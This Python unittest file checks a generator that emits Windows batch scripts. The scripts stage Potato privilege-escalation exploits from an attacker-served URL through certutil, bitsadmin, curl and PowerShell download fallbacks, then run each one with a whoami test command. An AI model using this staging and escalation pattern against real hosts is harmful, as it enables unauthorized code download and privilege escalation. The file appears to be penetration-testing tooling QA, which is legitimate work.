"""Smoke tests for winpriv/gen_potato_scan.py -- the auto-stage+scan generator that
emits a batch script probing every Potato variant.

The generator is print-only, so we drive it via subprocess and assert on the emitted
batch (same pattern as test_integration_recce.py). Default mode discovers Potato
exes in --serve-dir and emits STAGE + SCAN phases for those; tests use a tempdir
fixture with fake exe files so the discovery is deterministic."""
import os
import subprocess
import tempfile
import unittest

WINPRIV = os.path.join(os.path.dirname(__file__), "..", "winpriv")
SCAN = os.path.join(WINPRIV, "gen_potato_scan.py")


def _run(*args, expect_ok=True):
    r = subprocess.run(["python3", SCAN, *args], capture_output=True, text=True,
                       cwd=WINPRIV)
    if expect_ok:
        assert r.returncode == 0, f"scan generator failed: {r.stderr}"
    return r.stdout, r.stderr


def _fake_serve_dir(names):
    """Create a tempdir with fake Potato exes (size > 1024 so the size guard would
    pass on target). Returns the path. Caller is responsible for cleanup — use with
    tempfile.TemporaryDirectory for auto-cleanup."""
    d = tempfile.mkdtemp(prefix="pot_")
    for n in names:
        with open(os.path.join(d, n), "wb") as fh:
            fh.write(b"MZ" + b"\x00" * 2048)
    return d


class GenPotatoScan_NoStage(unittest.TestCase):
    """--no-stage = the pre-staging behavior (scan-only, assume every tool already
    landed in %STAGE% on the target)."""

    def test_default_no_stage_covers_every_potato_except_rogue(self):
        # RoguePotato needs the attacker-side socat OXID redirector and would just
        # false-fail on every scan; skipped by default.
        out, _ = _run("--no-stage")
        for tool in ("PrintSpoofer64.exe", "GodPotato-NET4.exe", "GodPotato-NET35.exe",
                     "GodPotato-NET2.exe", "EfsPotato.exe", "SharpEfsPotato.exe",
                     "JuicyPotatoNG.exe", "SweetPotato.exe", "GenericPotato.exe"):
            self.assertIn(tool, out, f"expected {tool} in --no-stage scan")
        self.assertNotIn("RoguePotato.exe", out)
        # STAGE phase must be absent under --no-stage:
        self.assertNotIn("=== STAGE ===", out)
        self.assertIn("=== SCAN ===", out)

    def test_no_stage_include_rogue_flag_adds_it(self):
        out, _ = _run("--no-stage", "--include-rogue")
        self.assertIn("RoguePotato.exe", out)

    def test_no_stage_positional_restricts_scan_set(self):
        out, _ = _run("--no-stage", "EfsPotato.exe", "SharpEfsPotato.exe")
        self.assertIn("EfsPotato.exe", out)
        self.assertIn("SharpEfsPotato.exe", out)
        self.assertNotIn("GodPotato", out)
        self.assertNotIn("SweetPotato.exe", out)


class GenPotatoScan_Stage(unittest.TestCase):
    """Default (staging) mode: discover Potato exes in --serve-dir and emit STAGE
    + SCAN blocks for those."""

    def test_missing_serve_dir_warns_and_produces_no_stage_blocks(self):
        # Empty --serve-dir: warn on stderr, emit batch with header comment but
        # no per-tool stage/scan blocks (nothing to stage or scan).
        with tempfile.TemporaryDirectory() as d:
            out, err = _run("--serve-dir", d)
            self.assertIn("no known Potato exes", err)
            self.assertNotIn("=== STAGE ===", out)
            self.assertNotIn("=== SCAN ===", out)

    def test_stage_and_scan_emitted_for_found_potatoes_only(self):
        # Fake three exes; the batch must stage + scan exactly those, none others.
        with tempfile.TemporaryDirectory() as d:
            for n in ("EfsPotato.exe", "GodPotato-NET4.exe", "SharpEfsPotato.exe"):
                with open(os.path.join(d, n), "wb") as fh:
                    fh.write(b"MZ" + b"\x00" * 2048)
            out, _ = _run("--serve-dir", d)
            self.assertIn("=== STAGE ===", out)
            self.assertIn("=== SCAN ===", out)
            for present in ("EfsPotato.exe", "GodPotato-NET4.exe", "SharpEfsPotato.exe"):
                self.assertIn(f"STAGE {present}", out)
                self.assertIn(f"SCAN {present}", out)
            # Absent tools must not appear in any stage/scan block header:
            for absent in ("SweetPotato.exe", "JuicyPotatoNG.exe"):
                self.assertNotIn(f"STAGE {absent}", out)
                self.assertNotIn(f"SCAN {absent}", out)

    def test_stage_block_tries_all_four_transports_in_order(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "EfsPotato.exe"), "wb") as fh:
                fh.write(b"MZ" + b"\x00" * 2048)
            out, _ = _run("--serve-dir", d)
            # certutil first, then bitsadmin, then curl, then powershell — the
            # order they appear in the emitted batch matters (fastest/quietest first).
            for tr in ("certutil", "bitsadmin", "curl", "powershell"):
                self.assertIn(f"[STAGED via {tr}", out)
            i_cert = out.index("certutil -urlcache")
            i_bits = out.index("bitsadmin /transfer")
            i_curl = out.index("where curl")
            i_ps = out.index("Net.WebClient")
            self.assertLess(i_cert, i_bits)
            self.assertLess(i_bits, i_curl)
            self.assertLess(i_curl, i_ps)

    def test_stage_guards_size_1024_min(self):
        # AV-nuked partial writes must roll to next transport, not be accepted.
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "EfsPotato.exe"), "wb") as fh:
                fh.write(b"MZ" + b"\x00" * 2048)
            out, _ = _run("--serve-dir", d)
            # The batch must guard every stage attempt with `!SIZE! GEQ 1024`:
            self.assertGreaterEqual(out.count("!SIZE! GEQ 1024"), 4)

    def test_serve_url_flag_overrides_default(self):
        # Default URL is http://LHOST (port 80). --serve-url lets you point at 8080
        # or a different host without touching _winpriv_common.py.
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "EfsPotato.exe"), "wb") as fh:
                fh.write(b"MZ" + b"\x00" * 2048)
            out, _ = _run("--serve-dir", d, "--serve-url", "http://10.9.8.7:8080")
            self.assertIn("set BASE=http://10.9.8.7:8080", out)
            # Trailing slash on --serve-url must be normalised (otherwise the
            # emitted URLs become //Efs...):
            out2, _ = _run("--serve-dir", d, "--serve-url", "http://x/")
            self.assertNotIn("//EfsPotato", out2)

    def test_case_insensitive_local_match_preserves_local_case_for_url(self):
        # If the operator has 'efspotato.exe' (lowercase), the local FS match must
        # succeed (case-insensitive), but the emitted URL + target save path must
        # use the LOCAL case exactly (Linux http.server is case-sensitive).
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "efspotato.exe"), "wb") as fh:
                fh.write(b"MZ" + b"\x00" * 2048)
            out, _ = _run("--serve-dir", d)
            self.assertIn("efspotato.exe", out)      # url + target path preserved
            self.assertIn("EfsPotato.exe", out)      # canonical name in labels/comment
            # The URL must use the local lowercase filename, not the canonical:
            self.assertIn("%BASE%/efspotato.exe", out)

    def test_no_scan_flag_stages_but_skips_probes(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "EfsPotato.exe"), "wb") as fh:
                fh.write(b"MZ" + b"\x00" * 2048)
            out, _ = _run("--serve-dir", d, "--no-scan")
            self.assertIn("=== STAGE ===", out)
            self.assertNotIn("=== SCAN ===", out)


class GenPotatoScan_Shared(unittest.TestCase):
    """Behavior shared across both modes: flags that flow through unchanged."""

    def test_timeout_flag_controls_ping_ticks(self):
        # ping -n <TIMEOUT+1> is the parallel sleep before the taskkill safety net.
        out, _ = _run("--no-stage", "--timeout", "10")
        self.assertIn("ping -n 11 127.0.0.1", out)
        out, _ = _run("--no-stage", "--timeout", "3")
        self.assertIn("ping -n 4 127.0.0.1", out)

    def test_short_tags_unique_across_godpotato_variants(self):
        # Regression: an earlier truncation collapsed all three GodPotato-NET* into
        # the same short tag, so their marker files and goto labels collided.
        out, _ = _run("--no-stage")
        labels = [ln.strip() for ln in out.splitlines()
                  if ln.strip().startswith((":after_stage_", ":after_scan_"))]
        self.assertEqual(len(labels), len(set(labels)))
        for v in ("godpotatonet2", "godpotatonet35", "godpotatonet4"):
            self.assertIn(f":after_scan_{v}", out)

    def test_output_is_valid_batch_shape(self):
        out, _ = _run("--no-stage")
        self.assertIn("@echo off", out)
        self.assertIn("setlocal enabledelayedexpansion", out)
        # The :size subroutine is always emitted at the end (called from stage
        # attempts and safe as a no-op if no stage block ever calls it):
        self.assertIn(":size", out)
        # Every scan block must pair a `start /b` with a `taskkill`:
        starts = out.count('start /b ""')
        kills = out.count("taskkill /f /im")
        self.assertEqual(starts, kills)

    def test_specific_tool_argv_uses_potatoes_cmdline_template(self):
        # If the operator uses the winner's TOOL in _winpriv_common.py and re-runs
        # gen_full/nonet/forma, the arg pattern must be the SAME the scan tested.
        import sys as _sys
        _sys.path.insert(0, WINPRIV)
        try:
            import _winpriv_common as P
        finally:
            _sys.path.pop(0)
        out, _ = _run("--no-stage", "GodPotato-NET4.exe")
        self.assertIn('-cmd "cmd.exe /c whoami>', out)
        self.assertEqual(P.POTATOES_CMDLINE["GodPotato-NET4.exe"], '-cmd "{CMD}"')


if __name__ == "__main__":
    unittest.main()
